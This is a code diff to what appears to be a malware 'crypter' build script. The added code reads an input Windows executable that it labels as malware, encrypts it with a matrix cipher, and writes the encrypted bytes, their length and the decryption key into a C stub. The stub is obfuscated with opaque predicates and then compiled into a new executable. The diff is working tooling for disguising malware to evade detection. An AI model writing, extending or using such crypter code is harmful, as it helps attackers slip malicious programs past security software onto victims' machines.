@@ -1,3 +1,4 @@
+import re
 import sys
 import csv
 import json
@@ -26,6 +27,7 @@ import src.lib.chandling.variableclassifier as variableclassifier
 import src.lib.chandling.dependencyresolver as dependencyresolver
 import src.lib.chandling.compilationhandler as compilationhandler
 import src.lib.obfuscation.control.opaqueif as opaqueif
+import src.lib.crypto.encryption as encryption
 import src.lib.obfuscation.control.opaquevariable as opaquevariable
 import src.lib.obfuscation.control.opaquepredicate as opaquepredicate
 import src.lib.obfuscation.visitors.opaqueifvisitor as opaqueifvisitor
@@ -39,19 +41,20 @@ TMP_INPUT_FILE = './src/crypters/idata_obfuscation/merged.c'
 FAKE_IMPORTS = '-I./src/fake_imports'
 
 if __name__ == '__main__':
-    if len(sys.argv) < 6:
-        print(f"Usage: {sys.argv[0]} <input.c> <output.c> <output_executable.exe> <json_headers_dataset.json> <includes_folder> [seed]")
+    if len(sys.argv) < 7:
+        print(f"Usage: {sys.argv[0]} <input.c> <output.c> <output_executable.exe> <input_pe_executable.exe> <json_headers_dataset.json> <includes_folder> [seed]")
         sys.exit(1)
 
     input_file  = sys.argv[1]
     output_file = sys.argv[2]
     output_executable_path = sys.argv[3]
-    json_headers_dataset = sys.argv[4]
-    includes_folder = sys.argv[5]
+    input_pe_executable = sys.argv[4]
+    json_headers_dataset = sys.argv[5]
+    includes_folder = sys.argv[6]
     seed = None
-    if len(sys.argv) == 7:
+    if len(sys.argv) == 8:
         print('Using selected seed...')
-        seed = sys.argv[6]
+        seed = sys.argv[7]
         key = seed[:prng.key_length * 2]
         nonce = seed[prng.key_length * 2: (prng.key_length + prng.nonce_length) * 2]
         prng.key = bytes.fromhex(key)
@@ -206,9 +209,57 @@ if __name__ == '__main__':
     for old, new in replacements:
         content = content.replace(old, new)
 
-    content = clang_text + '\n' + content
+    final_content = clang_text + '\n' + content
+    
+    print('Reading malware...')
+
+    with open(input_pe_executable, "rb") as f:
+        input_PE_data = f.read()
+    
+    print('Creating encryption objects...')
+
+    encryption_algorithm = encryption.SimpleMatrixEncryptionAlgorithm()
+
+    print('Encrypting malware...')
+
+    encrypted_data = encryption_algorithm.encrypt(input_PE_data)
+    size_encrypted_malware = len(encrypted_data)
+    encrypted_bytes_string = "".join(f"\\x{b:02x}" for b in encrypted_data)
+    
+    print('Writing encrypted malware to file...')
+    
+    final_content = re.sub(
+        r'(char executable_pe\[\]\s*=\s*")[^"]*(")',
+        lambda m: m.group(1) + encrypted_bytes_string + m.group(2),
+        final_content
+    )
+
+    print('Writing length of encrypted malware to file...')
+
+    final_content = re.sub(
+        r'(DWORD executable_size\s*=\s*)\d+(\s*;)',
+        lambda m: m.group(1) + str(size_encrypted_malware) + m.group(2),
+        final_content
+    )
+    
+    print('Writing decryption key matrix to file...')
+    
+    key_bytes = encryption_algorithm.decrypt_key
+    key_rows = [key_bytes[i:i+4] for i in range(0, 16, 4)]
+    key_matrix_string = '{' + ', '.join('{' + ', '.join(str(int(byte_value)) for byte_value in individual_row) + '}' for individual_row in key_rows) + '}'
+    
+    print(f'The decryption key is {key_matrix_string}...')
+
+    final_content = re.sub(
+        r'(static const int key_matrix_inverse\[4\]\[4\]\s*=\s*)\{.*?\};',
+        lambda m: m.group(1) + key_matrix_string + ';',
+        final_content
+    )
+
+    print('Writing final c file...')
+
     with open(output_file, 'w') as f:
-        f.write(content)
+        f.write(final_content)
     
     print('Compiling file into an executable...')
 
